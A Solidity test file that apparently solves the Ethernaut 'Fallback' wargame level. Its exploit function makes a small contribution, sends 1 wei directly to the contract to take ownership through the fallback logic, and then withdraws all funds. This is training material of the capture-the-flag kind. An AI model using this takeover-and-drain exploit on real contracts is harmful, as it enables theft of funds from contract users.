// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Fallback.sol";
import "src/levels/FallbackFactory.sol";

contract TestFallback is BaseTest {
    Fallback private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new FallbackFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Fallback(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.owner(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        // send the minimum amount to become a contributor
        level.contribute{value: 0.0001 ether}();

        // send directly to the contract 1 wei, this will allow us to become the new owner
        (bool sent, ) = address(level).call{value: 1}("");
        require(sent, "Failed to send Ether to the level");

        // now that we are the owner of the contract withdraw all the funds
        level.withdraw();

        vm.stopPrank();
    }
}
